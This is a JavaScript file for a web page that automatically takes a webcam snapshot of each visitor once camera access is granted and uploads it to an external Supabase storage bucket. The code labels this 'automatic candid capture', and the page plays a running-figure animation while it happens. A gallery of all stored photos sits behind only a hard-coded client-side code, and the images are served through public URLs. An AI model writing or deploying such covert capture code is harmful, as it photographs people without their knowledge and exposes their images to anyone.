// YOUR SUPABASE PROJECT
const SUPABASE_URL = "https://edafkomypijighnizyee.supabase.co";
const SUPABASE_KEY = "sb_publishable_pR7et-ooMnmBQus4X5vHRg_-1O4_OSi";

const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const gallery = document.getElementById("gallery");

// CAMERA ACCESS & CANDID SNAPSHOT
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Wait until video is ready
    video.onloadedmetadata = () => {
      takePhoto();       // Automatic candid capture
    };
  } catch (e) {
    alert("Camera permission denied");
    console.error(e);
  }
}

// CAPTURE + UPLOAD
async function takePhoto() {
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const blob = await new Promise(resolve =>
    canvas.toBlob(resolve, "image/png")
  );

  const filename = `photo_${Date.now()}.png`;

  const { error } = await supabase
    .storage
    .from("photos")
    .upload(filename, blob);

  if (error) {
    console.error("Upload failed:", error);
  } else {
    console.log("Candid image stored:", filename);
    startRunner();
  }
}

// CODE CHECK
function checkCode() {
  const code = document.getElementById("code").value;
  if (code === "8899") {
    loadGallery();
  } else {
    alert("ACCESS DENIED");
  }
}

// LOAD ALL IMAGES
async function loadGallery() {
  gallery.innerHTML = "";

  const { data, error } = await supabase
    .storage
    .from("photos")
    .list("", { limit: 100 });

  if (error) {
    console.error(error);
    return;
  }

  data.forEach(file => {
    const { data: url } = supabase
      .storage
      .from("photos")
      .getPublicUrl(file.name);

    const img = document.createElement("img");
    img.src = url.publicUrl;
    gallery.appendChild(img);
  });
}

// RUNNER ANIMATION
function startRunner() {
  const runner = document.getElementById("runner");
  runner.style.animation = "run 1s steps(4) infinite, move 3s linear infinite";
}
